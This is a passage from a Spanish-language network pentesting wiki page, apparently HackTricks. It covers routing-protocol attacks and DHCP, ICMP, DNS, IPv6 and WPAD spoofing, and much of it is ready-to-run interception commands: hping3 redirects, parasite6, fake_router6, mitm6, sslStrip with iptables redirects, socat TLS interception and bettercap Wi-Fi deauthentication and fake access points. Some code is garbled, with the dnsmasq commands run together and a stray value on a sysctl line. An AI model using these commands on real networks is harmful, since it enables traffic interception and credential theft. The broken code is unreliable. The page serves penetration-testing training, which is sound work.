**FHRP** (First Hop Redundancy Protocol) es una clase de protocolos de red diseñados para **crear un sistema de enrutamiento redundante en caliente**. Con FHRP, los enrutadores físicos pueden combinarse en un solo dispositivo lógico, lo que aumenta la tolerancia a fallos y ayuda a distribuir la carga.

**Los ingenieros de Cisco Systems han desarrollado dos protocolos FHRP, GLBP y HSRP.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Se conocen tres versiones del Protocolo de Información de Enrutamiento (RIP): RIP, RIPv2 y RIPng. Los datagramas se envían a pares a través del puerto 520 utilizando UDP por RIP y RIPv2, mientras que los datagramas se transmiten al puerto UDP 521 a través de multicast IPv6 por RIPng. El soporte para autenticación MD5 fue introducido por RIPv2. Por otro lado, la autenticación nativa no está incorporada por RIPng; en su lugar, se confía en encabezados opcionales de IPsec AH y ESP dentro de IPv6.

- **RIP y RIPv2:** La comunicación se realiza a través de datagramas UDP en el puerto 520.
- **RIPng:** Utiliza el puerto UDP 521 para transmitir datagramas a través de multicast IPv6.

Tenga en cuenta que RIPv2 admite autenticación MD5 mientras que RIPng no incluye autenticación nativa, confiando en encabezados IPsec AH y ESP en IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** es un protocolo de enrutamiento dinámico. **Es un protocolo de vector de distancia.** Si no hay **autenticación** y configuración de interfaces pasivas, un **intruso** puede interferir con el enrutamiento de EIGRP y causar **envenenamiento de tablas de enrutamiento**. Además, la red EIGRP (en otras palabras, el sistema autónomo) **es plana y no tiene segmentación en zonas**. Si un **atacante inyecta una ruta**, es probable que esta ruta se **propague** por todo el sistema EIGRP autónomo.

Atacar un sistema EIGRP requiere **establecer un vecindario con un enrutador EIGRP legítimo**, lo que abre muchas posibilidades, desde reconocimiento básico hasta diversas inyecciones.

[**FRRouting**](https://frrouting.org/) le permite implementar **un enrutador virtual que admite BGP, OSPF, EIGRP, RIP y otros protocolos.** Todo lo que necesita hacer es desplegarlo en el sistema de su atacante y puede pretender ser un enrutador legítimo en el dominio de enrutamiento.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) tiene capacidades para interceptar transmisiones de EIGRP (Enhanced Interior Gateway Routing Protocol). También permite la inyección de paquetes, que se pueden utilizar para alterar configuraciones de enrutamiento.

### OSPF

En el protocolo Open Shortest Path First (OSPF), **la autenticación MD5 se emplea comúnmente para garantizar una comunicación segura entre enrutadores**. Sin embargo, esta medida de seguridad puede ser comprometida utilizando herramientas como Loki y John the Ripper. Estas herramientas son capaces de capturar y descifrar hashes MD5, exponiendo la clave de autenticación. Una vez que se obtiene esta clave, se puede utilizar para introducir nueva información de enrutamiento. Para configurar los parámetros de la ruta y establecer la clave comprometida, se utilizan las pestañas _Injection_ y _Connection_, respectivamente.

- **Captura y Descifrado de Hashes MD5:** Se utilizan herramientas como Loki y John the Ripper para este propósito.
- **Configuración de Parámetros de Ruta:** Esto se realiza a través de la pestaña _Injection_.
- **Configuración de la Clave Comprometida:** La clave se configura en la pestaña _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Herramienta para escanear el tráfico de red y encontrar vulnerabilidades
- Puede encontrar **más información sobre ataques de red** [**aquí**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

El atacante configura todos los parámetros de red (GW, IP, DNS) del nuevo miembro de la red enviando respuestas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Consulta la [sección anterior](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste en enviar un paquete ICMP tipo 1 código 5 que indica que el atacante es la mejor manera de alcanzar una IP. Luego, cuando la víctima quiera contactar la IP, enviará el paquete a través del atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

El atacante resolverá algunos (o todos) los dominios que la víctima solicite.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar propio DNS con dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Puertas de enlace locales

A menudo existen múltiples rutas hacia sistemas y redes. Al crear una lista de direcciones MAC dentro de la red local, utiliza _gateway-finder.py_ para identificar hosts que soportan el reenvío de IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, y mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Para la resolución de hosts locales cuando las búsquedas DNS no tienen éxito, los sistemas de Microsoft dependen de **Link-Local Multicast Name Resolution (LLMNR)** y el **NetBIOS Name Service (NBT-NS)**. De manera similar, **Apple Bonjour** y las implementaciones de **Linux de configuración cero** utilizan **Multicast DNS (mDNS)** para descubrir sistemas dentro de una red. Debido a la naturaleza no autenticada de estos protocolos y su operación sobre UDP, transmitiendo mensajes, pueden ser explotados por atacantes que buscan redirigir a los usuarios a servicios maliciosos.

Puedes suplantar servicios que son buscados por hosts utilizando Responder para enviar respuestas falsas.\
Lee aquí más información sobre [cómo suplantar servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Los navegadores comúnmente emplean el **protocolo Web Proxy Auto-Discovery (WPAD) para adquirir automáticamente configuraciones de proxy**. Esto implica obtener detalles de configuración de un servidor, específicamente a través de una URL como "http://wpad.example.org/wpad.dat". El descubrimiento de este servidor por los clientes puede ocurrir a través de varios mecanismos:

- A través de **DHCP**, donde el descubrimiento se facilita utilizando una entrada de código especial 252.
- Por **DNS**, que implica buscar un nombre de host etiquetado como _wpad_ dentro del dominio local.
- A través de **Microsoft LLMNR y NBT-NS**, que son mecanismos de respaldo utilizados en casos donde las búsquedas DNS no tienen éxito.

La herramienta Responder aprovecha este protocolo actuando como un **servidor WPAD malicioso**. Utiliza DHCP, DNS, LLMNR y NBT-NS para engañar a los clientes y hacer que se conecten a él. Para profundizar en cómo se pueden suplantar servicios utilizando Responder [consulta esto](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP y dispositivos UPnP](spoofing-ssdp-and-upnp-devices.md)

Puedes ofrecer diferentes servicios en la red para intentar **engañar a un usuario** para que ingrese algunas **credenciales en texto plano**. **Más información sobre este ataque en** [**Spoofing SSDP y Dispositivos UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Spoofing de Vecinos IPv6

Este ataque es muy similar al Spoofing ARP pero en el mundo IPv6. Puedes hacer que la víctima piense que el IPv6 del GW tiene la MAC del atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Suplantación/Inundación de Anuncios de Router IPv6

Algunos sistemas operativos configuran por defecto la puerta de enlace a partir de los paquetes RA enviados en la red. Para declarar al atacante como router IPv6, puedes usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Suplantación de DHCP IPv6

Por defecto, algunos sistemas operativos intentan configurar el DNS leyendo un paquete DHCPv6 en la red. Entonces, un atacante podría enviar un paquete DHCPv6 para configurarse a sí mismo como DNS. El DHCP también proporciona una IPv6 a la víctima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (página falsa e inyección de código JS)

## Ataques a Internet

### sslStrip

Básicamente, lo que hace este ataque es que, en caso de que el **usuario** intente **acceder** a una página **HTTP** que está **redireccionando** a la versión **HTTPS**. **sslStrip** mantendrá una **conexión HTTP con** el **cliente** y una **conexión HTTPS con** el **servidor**, por lo que podrá **interceptar** la conexión en **texto plano**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Más información [aquí](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ y dns2proxy para eludir HSTS

La **diferencia** entre **sslStrip+ y dns2proxy** contra **sslStrip** es que **redirigirán** por ejemplo _**www.facebook.com**_ **a** _**wwww.facebook.com**_ (note la **extra** "**w**") y establecerán la **dirección de este dominio como la IP del atacante**. De esta manera, el **cliente** se **conectará** a _**wwww.facebook.com**_ **(el atacante)**, pero tras bambalinas **sslstrip+** **mantendrá** la **conexión real** a través de https con **www.facebook.com**.

El **objetivo** de esta técnica es **evitar HSTS** porque _**wwww**.facebook.com_ **no será** guardado en la **caché** del navegador, por lo que el navegador será engañado para realizar **la autenticación de facebook en HTTP**.\
Tenga en cuenta que para realizar este ataque la víctima debe intentar acceder inicialmente a [http://www.faceook.com](http://www.faceook.com) y no a https. Esto se puede hacer modificando los enlaces dentro de una página http.

Más información [aquí](https://www.bettercap.org/legacy/#hsts-bypass), [aquí](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) y [aquí](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip o sslStrip+ ya no funcionan. Esto se debe a que hay reglas HSTS preguardadas en los navegadores, por lo que incluso si es la primera vez que un usuario accede a un dominio "importante", lo hará a través de HTTPS. Además, tenga en cuenta que las reglas preguardadas y otras reglas generadas pueden usar la bandera** [**`includeSubdomains`**](https://hstspreload.appspot.com) **por lo que el** _**wwww.facebook.com**_ **ejemplo de antes ya no funcionará ya que** _**facebook.com**_ **usa HSTS con `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP escucha en el puerto
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL escuchar en el puerto

#### Generar claves y certificado autofirmado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escuchar usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escuchar usando certificado y redirigir a los hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A veces, si el cliente verifica que la CA es válida, podrías **servir un certificado de otro nombre de host firmado por una CA**.\
Otra prueba interesante es **servir un certificado del nombre de host solicitado pero autofirmado**.

Otras cosas a probar son intentar firmar el certificado con un certificado válido que no sea una CA válida. O usar la clave pública válida, forzar el uso de un algoritmo como Diffie-Hellman (uno que no necesite descifrar nada con la verdadera clave privada) y cuando el cliente solicite una prueba de la verdadera clave privada (como un hash), enviar una prueba falsa y esperar que el cliente no verifique esto.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descubrimiento Activo

Tenga en cuenta que cuando se envía un paquete UDP a un dispositivo que no tiene el puerto solicitado, se envía un ICMP (Puerto Inalcanzable).

### **Descubrimiento ARP**

Los paquetes ARP se utilizan para descubrir qué IPs se están utilizando dentro de la red. La PC tiene que enviar una solicitud para cada posible dirección IP y solo las que están en uso responderán.

### **mDNS (DNS multicast)**

Bettercap envía una solicitud MDNS (cada X ms) pidiendo **\_services\_.dns-sd.\_udp.local**. La máquina que ve este paquete generalmente responde a esta solicitud. Luego, solo busca máquinas que respondan a "services".

**Herramientas**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap transmite paquetes al puerto 137/UDP pidiendo el nombre "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Protocolo de Descubrimiento de Servicios Simple)**

Bettercap transmite paquetes SSDP buscando todo tipo de servicios (Puerto UDP 1900).

### **WSD (Descubrimiento de Servicios Web)**

Bettercap transmite paquetes WSD buscando servicios (Puerto UDP 3702).

## Referencias

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Evaluación de Seguridad de Redes: Conozca Su Red (3ra edición)**
- **Hacking Práctico de IoT: La Guía Definitiva para Atacar el Internet de las Cosas. Por Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
